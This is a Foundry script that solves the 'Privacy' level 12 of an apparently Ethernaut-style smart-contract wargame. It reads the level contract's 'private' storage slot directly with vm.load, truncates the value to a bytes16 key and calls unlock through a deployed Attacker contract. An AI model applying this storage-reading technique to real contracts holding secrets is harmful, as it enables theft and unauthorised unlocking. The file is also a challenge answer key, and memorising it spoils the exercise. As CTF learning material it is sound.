// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Privacy} from "../src/level12/Privacy.sol";

contract Attacker {
    Privacy level;

    constructor(address level_) {
        level = Privacy(level_);
    }

    function attack(bytes16 _key) public {
        level.unlock(_key);
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3;

        Attacker attacker = new Attacker(levelAddr);

        uint256 levelDataSlotStartIdx = 3;

        bytes32 dataInPos2 = vm.load(
            levelAddr,
            bytes32(levelDataSlotStartIdx + 2)
        );

        bytes16 _key = bytes16(dataInPos2);

        attacker.attack(_key);

        vm.stopBroadcast();
    }
}
